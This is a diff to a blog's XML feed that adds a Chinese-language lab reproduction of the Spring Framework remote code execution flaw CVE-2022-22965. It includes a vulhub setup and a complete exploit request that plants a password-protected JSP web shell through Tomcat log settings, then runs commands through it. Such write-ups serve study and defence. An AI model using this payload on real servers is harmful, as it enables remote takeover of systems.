@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>Spring Framework远程代码执行漏洞(CVE-2022-22965)</title>
+      <link href="/2022/05/08/Spring-Framework/"/>
+      <url>/2022/05/08/Spring-Framework/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Framework远程代码执行漏洞"><a href="#Spring-Framework远程代码执行漏洞" class="headerlink" title="Spring Framework远程代码执行漏洞"></a>Spring Framework远程代码执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>在JDK 9+上运行的Spring MVC或Spring WebFlux应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。</p><p>现在已知的利用方法要求应用程序以WAR部署的形式在Tomcat上运行，然而，该漏洞的性质更为普遍，可能有其他方法可以利用它。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring Framework 5.3.X &lt; 5.3.18 、2.X &lt; 5.2.20 或者其他版本</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22965docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先打开<code>http://192.168.3.151:8080/?name=test&amp;age=18</code></p><p><img src="/2022/05/08/Spring-Framework/image-20220508113603008.png" alt="image-20220508113603008"></p><p>构造数据包修改目标的tomcat日志路径与后缀，写入JSP文件</p><pre class=" language-Linux"><code class="language-Linux">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: 192.168.3.151:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Cookie: JSESSIONID=52F637A45D1E8B58214F3D85E166A223suffix: %>//c1: Runtimec2: <%DNT: 1Connection: closeUpgrade-Insecure-Requests: 1</code></pre><p><img src="/2022/05/08/Spring-Framework/image-20220508141959161.png" alt="image-20220508141959161"></p><p>可以执行任意命令</p><pre class=" language-Linux"><code class="language-Linux">http://192.168.3.151:8080/tomcatwar.jsp?pwd=j&cmd=id</code></pre><p><img src="/2022/05/08/Spring-Framework/image-20220508142119920.png" alt="image-20220508142119920"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Spring Cloud Function SpEL表达式命令注入(CVE-2022-22963)</title>
       <link href="/2022/05/07/Spring-Cloud-Function/"/>
       <url>/2022/05/07/Spring-Cloud-Function/</url>
